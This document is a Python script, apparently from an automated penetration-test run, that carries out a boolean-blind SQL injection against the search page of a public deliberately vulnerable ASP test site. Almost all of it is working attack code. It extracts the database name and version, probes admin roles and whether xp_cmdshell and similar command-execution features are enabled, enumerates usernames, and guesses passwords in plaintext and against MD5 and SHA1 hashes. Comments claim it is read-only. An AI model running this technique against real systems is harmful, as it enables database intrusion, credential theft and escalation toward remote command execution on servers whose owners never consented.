#!/usr/bin/env python3
"""Round 8 — search.asp boolean-blind 오라클로 DB 사실 추출 (전부 읽기 전용 SELECT).

오라클: tfSearch = zzq')>0 OR (<cond>))--   → TRUE = 게시글 렌더(>0행) / FALSE = 0행
모든 cond 는 순수 SELECT/스칼라식. 쓰기·설정변경·명령실행 없음(xp_cmdshell 은 '상태만 조회').
추출한 자격증명 '값'은 저장하지 않는다(SKILL 지침) — 형식·길이·일치여부만 기록.
"""
import json, sys, time, urllib.parse, urllib.request, urllib.error

BASE = "http://testasp.vulnweb.com/search.asp"
DELAY = 0.05
REQ = {"n": 0}


def oracle(cond):
    """True / False / None(구문오류 등으로 판정불가)"""
    st = "zzq')>0 OR (" + cond + "))--"
    url = BASE + "?tfSearch=" + urllib.parse.quote(st, safe="")
    REQ["n"] += 1
    for _ in range(2):
        try:
            with urllib.request.urlopen(url, timeout=30) as r:
                body = r.read().decode("latin-1", "replace")
                return "class='posttext'" in body
        except urllib.error.HTTPError as e:
            body = e.read().decode("latin-1", "replace")
            if e.code == 500:
                return None
            return "class='posttext'" in body
        except Exception:
            time.sleep(1.0)
    return None
    time.sleep(DELAY)


def exact_int(expr, lo=0, hi=100000):
    """expr 의 스칼라 정수값을 이분탐색으로 정확히 반환 (값 >= lo 가정)"""
    if oracle(f"({expr})>={lo}") is not True:
        return None
    while lo < hi:
        mid = (lo + hi + 1) // 2
        r = oracle(f"({expr})>={mid}")
        if r is True:
            lo = mid
        elif r is False:
            hi = mid - 1
        else:
            return None
    return lo


def extract(expr, n, cap=None):
    """expr 의 선두 n글자를 ASCII 이분탐색으로 추출"""
    out = ""
    for i in range(1, n + 1):
        lo, hi = 1, 126
        while lo < hi:
            mid = (lo + hi) // 2
            r = oracle(f"(SELECT ASCII(SUBSTRING(({expr}),{i},1)))>{mid}")
            if r is True:
                lo = mid + 1
            elif r is False:
                hi = mid
            else:
                return out + "<?>"
        if lo <= 1:
            break
        out += chr(lo)
    return out


def main():
    R = {"booleans": {}, "integers": {}, "strings": {}, "notes": []}

    def B(label, cond):
        v = oracle(cond)
        R["booleans"][label] = v
        print(f"  {'TRUE ' if v is True else ('FALSE' if v is False else '??   ')}  {label}")
        return v

    def I(label, expr, hi=100000):
        v = exact_int(expr, 0, hi)
        R["integers"][label] = v
        print(f"  = {str(v):>8}   {label}")
        return v

    print("### 0. 오라클 기준선 확인")
    print("  TRUE 기준선 :", oracle("1=1"), " FALSE 기준선 :", oracle("1=2"))
    if oracle("1=1") is not True:
        print("!! 오라클 불안정 — 중단"); sys.exit(1)

    print("\n### 1. 현재 세션 주체 / 서버")
    R["strings"]["DB_NAME()"] = extract("DB_NAME()", 30)
    R["strings"]["SYSTEM_USER"] = extract("SYSTEM_USER", 30)
    R["strings"]["SUSER_SNAME()"] = extract("SUSER_SNAME()", 40)
    R["strings"]["USER_NAME()"] = extract("USER_NAME()", 30)
    R["strings"]["SERVERPROPERTY(ProductVersion)"] = extract("SERVERPROPERTY('ProductVersion')", 24)
    R["strings"]["SERVERPROPERTY(Edition)"] = extract("SERVERPROPERTY('Edition')", 40)
    for k, v in R["strings"].items():
        print(f"  {k} = {v}")

    print("\n### 2. 권한 등급 (RCE 사슬 판정 핵심)")
    B("IS_SRVROLEMEMBER('sysadmin')=1", "IS_SRVROLEMEMBER('sysadmin')=1")
    B("IS_SRVROLEMEMBER('sysadmin','acunetix')=1", "IS_SRVROLEMEMBER('sysadmin','acunetix')=1")
    B("IS_SRVROLEMEMBER('serveradmin')=1", "IS_SRVROLEMEMBER('serveradmin')=1")
    B("IS_SRVROLEMEMBER('securityadmin')=1", "IS_SRVROLEMEMBER('securityadmin')=1")
    B("IS_MEMBER('db_owner')=1", "IS_MEMBER('db_owner')=1")
    B("HAS_PERMS_BY_NAME(NULL,NULL,'CONTROL SERVER')=1",
      "HAS_PERMS_BY_NAME(NULL,NULL,'CONTROL SERVER')=1")
    B("HAS_PERMS_BY_NAME(NULL,NULL,'ALTER SETTINGS')=1",
      "HAS_PERMS_BY_NAME(NULL,NULL,'ALTER SETTINGS')=1")
    I("sysadmin 로그인 수", "(SELECT COUNT(*) FROM sys.syslogins WHERE sysadmin=1)", 50)

    print("\n### 3. xp_cmdshell / OLE / CLR 설정 상태 (조회만 — 변경 안 함)")
    for name, label in [("xp_cmdshell", "xp_cmdshell"),
                        ("show advanced options", "show advanced options"),
                        ("Ole Automation Procedures", "Ole Automation"),
                        ("clr enabled", "clr enabled"),
                        ("Ad Hoc Distributed Queries", "Ad Hoc Distributed Queries"),
                        ("Agent XPs", "Agent XPs")]:
        v = exact_int(f"(SELECT CAST(value_in_use AS int) FROM sys.configurations WHERE name='{name}')", 0, 3)
        R["integers"][f"config[{label}]"] = v
        print(f"  value_in_use = {v}   {label}")
    B("OBJECT_ID('sys.xp_cmdshell') IS NOT NULL (확장프로시저 존재)",
      "OBJECT_ID('sys.xp_cmdshell') IS NOT NULL")
    I("sys.configurations 행 수(조회권한 확인)", "(SELECT COUNT(*) FROM sys.configurations)", 100)
    B("xp_cmdshell 프로시저 호출권한(EXECUTE) 보유",
      "HAS_PERMS_BY_NAME('sys.xp_cmdshell','OBJECT','EXECUTE')=1")

    print("\n### 4. users 테이블 구조")
    I("users 행 수", "(SELECT COUNT(*) FROM users)", 1000)
    I("users 컬럼 수", "(SELECT COUNT(*) FROM sys.columns WHERE object_id=OBJECT_ID('users'))", 60)
    for col in ["uname", "upass", "id", "userid", "email", "isadmin", "is_admin", "admin",
                "ulevel", "level", "ustatus", "fullname", "uemail", "upwd", "pwd", "pass"]:
        B(f"컬럼 '{col}' 존재", f"COL_LENGTH('users','{col}') IS NOT NULL")
    I("게시판 테이블 수", "(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)", 100)

    print("\n### 5. 계정명 열거 (uname ASC 순회)")
    unames = []
    prev = ""
    for k in range(1, 21):
        cond = f"(SELECT MIN(uname) FROM users WHERE uname > '{prev}')"
        if oracle(f"{cond} IS NOT NULL") is not True:
            break
        ln = exact_int(f"LEN({cond})", 1, 40)
        if not ln:
            break
        nm = extract(cond, ln)
        unames.append(nm)
        print(f"  [{k}] {nm!r}")
        prev = nm.replace("'", "''")
        if ln >= 40:
            break
    R["unames"] = unames
    R["notes"].append("uname 값은 열거 목록으로만 보존(자격증명 아님)")

    print("\n### 6. 비밀번호 저장형식 판정 (값은 저장하지 않음)")
    for label, cond in [
        ("upass 길이 <= 12 (평문 가능성)", "(SELECT COUNT(*) FROM users WHERE LEN(upass)<=12)>0"),
        ("upass 길이 >= 32 (해시 가능성)", "(SELECT COUNT(*) FROM users WHERE LEN(upass)>=32)>0"),
        ("upass 가 uname 과 동일한 행 존재", "(SELECT COUNT(*) FROM users WHERE upass=uname)>0"),
        ("upass 가 16진 문자열만 사용", "(SELECT COUNT(*) FROM users WHERE upass NOT LIKE '%[^0-9a-fA-F]%')>0"),
        ("upass 상위24자리에서 헥스 확인", "(SELECT COUNT(*) FROM users WHERE upass LIKE '[0-9a-fA-F][0-9a-fA-F][0-9a-fA-F][0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]%')>0"),
    ]:
        B(label, cond)
    I("upass 평균길이(정수부)", "(SELECT AVG(LEN(upass)) FROM users)", 100)

    print("\n### 7. 계정-비밀번호 일치 오라클 (평문 후보 직접검증, 해시 후보는 HASHBYTES 대조)")
    if not unames:
        print("  (열거된 계정 없음 — 스킵)")
    cands = ["admin", "password", "acunetix", "123456", "test", "admin123",
             "acunetix123", "letmein", "qwerty", "adminadmin"]
    hits = []
    for u in unames:
        ue = u.replace("'", "''")
        for p in cands:
            pe = p.replace("'", "''")
            plain = oracle(f"(SELECT COUNT(*) FROM users WHERE uname='{ue}' AND upass='{pe}')>0")
            md5 = oracle(f"(SELECT COUNT(*) FROM users WHERE uname='{ue}' AND "
                         f"UPPER(upass)=CONVERT(varchar(32),HASHBYTES('MD5','{pe}'),2))>0")
            sha1 = oracle(f"(SELECT COUNT(*) FROM users WHERE uname='{ue}' AND "
                          f"UPPER(upass)=CONVERT(varchar(40),HASHBYTES('SHA1','{pe}'),2))>0")
            if plain is True or md5 is True or sha1 is True:
                kind = "PLAINTEXT" if plain else ("MD5" if md5 else "SHA1")
                hits.append({"uname": u, "plaintext_candidate": p if plain else "[해시대응]",
                             "scheme": kind})
                print(f"  ★ 일치: uname={u!r} 후보={p!r} 방식={kind}")
    R["credential_hits"] = hits
    R["notes"].append("일치한 비밀번호 값은 저장하지 않음 — '후보 일치 사실'과 해시 방식만 기록")

    print("\n### 8. 측면 확장 가능성 (읽기 전용 사실조사)")
    I("연결된 서버 수", "(SELECT COUNT(*) FROM sys.servers)", 50)
    I("사용자 DB 수", "(SELECT COUNT(*) FROM sys.databases)", 50)
    B("TABLES 에 'users' 존재", "(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='users')>0")
    B("sys.sql_logins 조회 가능", "(SELECT COUNT(*) FROM sys.sql_logins)>0")
    R["mssql_version_string"] = extract("@@VERSION", 60)
    print("  @@VERSION(60자) =", R["mssql_version_string"])

    R["requests"] = REQ["n"]
    with open("out/db_facts.json", "w", encoding="utf-8") as f:
        json.dump(R, f, ensure_ascii=False, indent=2)
    print(f"\n### 완료 — 총 요청 {REQ['n']}건 → out/db_facts.json")


if __name__ == "__main__":
    main()
